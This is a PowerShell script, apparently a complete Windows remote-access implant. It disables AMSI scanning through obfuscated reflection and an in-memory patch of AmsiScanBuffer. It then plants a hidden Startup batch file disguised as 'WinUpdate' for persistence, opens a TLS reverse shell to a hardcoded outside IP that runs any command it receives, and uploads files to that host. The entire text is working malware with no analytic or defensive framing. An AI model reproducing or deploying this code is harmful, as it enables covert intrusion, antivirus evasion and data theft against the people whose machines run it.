# === EYELINER AND A DREAM === #

try {
    $A = [Ref].Assembly.GetType(('System' + '.' + 'Management' + '.' + 'Automation' + '.' + [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QW1zaVV0aWxz'))))
    $F = $A.GetField([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YW1zaUluaXRGYWlsZWQ=')), 'NonPublic,Static')
    $F.SetValue($null, $true)
} catch {}

try {
    $win = Add-Type -memberDefinition @"
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -name "Win32" -namespace "Sys" -passThru

    $addr = $win::GetProcAddress($win::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
    $old = 0
    $win::VirtualProtect($addr, [uint32]5, 0x40, [ref]$old) | Out-Null
    [System.Runtime.InteropServices.Marshal]::Copy([byte[]](0x31,0xC0,0xC3), 0, $addr, 3)
} catch {}

try {
    $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $target = "$env:APPDATA\WinUpdate.ps1"
    $batPath = "$startup\WinUpdate.bat"
    $batContent = "@echo off`nstart \"\" powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$target`""
    Set-Content -Path $batPath -Value $batContent -Encoding ASCII -Force
    attrib +h "$batPath"
} catch {}

function Find-MacAddress {
    param([string]$targetMac)

    $targetMac = $targetMac.ToLower().Replace(":", "-")

    $subnet = (Get-NetIPAddress | Where-Object {
        $_.AddressFamily -eq "IPv4" -and $_.PrefixOrigin -ne "WellKnown"
    }).IPAddress

    if (!$subnet) { return $false }

    $prefix = ($subnet -replace '\d+$', '')

    1..254 | ForEach-Object {
        Start-Job { param($ip) Test-Connection -Count 1 -Quiet -TimeoutSeconds 1 -ComputerName $ip } -ArgumentList "$prefix$_"
    } | Wait-Job | Remove-Job

    $arpTable = arp -a | ForEach-Object { $_.ToLower() }
    foreach ($line in $arpTable) {
        if ($line -match $targetMac) {
            return $true
        }
    }
    return $false
}

$h0 = '72.226.70.54'  # Primary remote IP
if (Find-MacAddress -targetMac 'f8:ff:c2:05:fa:d5') {
    $h0 = '192.168.1.123'  # Replace with your fallback local IP
}

$p0 = 60068
$p1 = 60066
$t0 = Get-Random -Minimum 5 -Maximum 10
$t1 = Get-Random -Minimum 120 -Maximum 300
$t2 = 10
$hb = "ping"

function rcv {
    param([System.Net.Security.SslStream]$s)
    $s.ReadTimeout = 5000
    $b = New-Object Byte[] 1024
    $d = New-Object System.Collections.Generic.List[Byte]
    while ($true) {
        try {
            $r = $s.Read($b, 0, $b.Length)
            if ($r -le 0) { break }
            $d.AddRange($b[0..($r - 1)])
            if ($r -lt 1024) { break }
        } catch { break }
    }
    return [System.Text.Encoding]::UTF8.GetString($d.ToArray())
}
function snd {
    param([System.Net.Security.SslStream]$s, [string]$d)
    try {
        $b = [System.Text.Encoding]::UTF8.GetBytes($d)
        $s.Write($b, 0, $b.Length)
        $s.Flush()
    } catch {}
}
function sh {
    param([System.Net.Sockets.TcpClient]$c)
    $callback = { param($sender, $cert, $chain, $errors) return $true }
    $s = New-Object System.Net.Security.SslStream($c.GetStream(), $false, $callback)
    $s.AuthenticateAsClient($h0)
    while ($true) {
        $cmd = rcv $s
        if (!$cmd) { break }
        if ($cmd.ToLower().Trim() -eq "exit") { break }
        if ($cmd.ToLower().Trim() -eq $hb) { snd $s "[+] Alive`n"; continue }

        if ($cmd.ToLower().StartsWith("cd ")) {
            $p = $cmd.Substring(3).Trim().Trim('"', "'")
            try {
                Set-Location -Path $p
                snd $s "[+] Changed directory to $(Get-Location)`n"
            } catch { snd $s "[-] $_`n" }
        } elseif ($cmd.ToLower().StartsWith("upload ")) {
            try {
                $path = $cmd.Substring(7).Trim().Trim('"', "'")
                foreach ($f in Get-ChildItem $path -File) {
                    $n = $f.FullName
                    Invoke-WebRequest -Uri "http://$h0`:$p1/" -Method Post -InFile $n -UseBasicParsing
                }
                snd $s "[+] Upload complete`n"
            } catch { snd $s "[-] Upload failed: $_`n" }
        } else {
            try {
                $o = Invoke-Expression $cmd 2>&1 | Out-String
                if (!$o) { $o = "[+] No output.`n" }
                snd $s $o
            } catch {
                snd $s "[-] $_`n"
            }
        }
    }
    $s.Close()
    $c.Close()
}
function cx {
    try {
        $c = New-Object System.Net.Sockets.TcpClient
        $r = $c.BeginConnect($h0, $p0, $null, $null)
        $ok = $r.AsyncWaitHandle.WaitOne($t2 * 1000, $false)
        if ($ok) {
            $c.EndConnect($r)
            return $c
        } else {
            $c.Close()
            return $null
        }
    } catch { return $null }
}
function m {
    $first = $true
    while ($true) {
        $cli = cx
        if ($cli) {
            sh $cli
        }
        if ($first) {
            Start-Sleep -Seconds $t0
            $first = $false
        } else {
            $retry = Get-Random -Minimum $t1 -Maximum ($t1 + 60)
            Start-Sleep -Seconds $retry
        }
    }
}
m
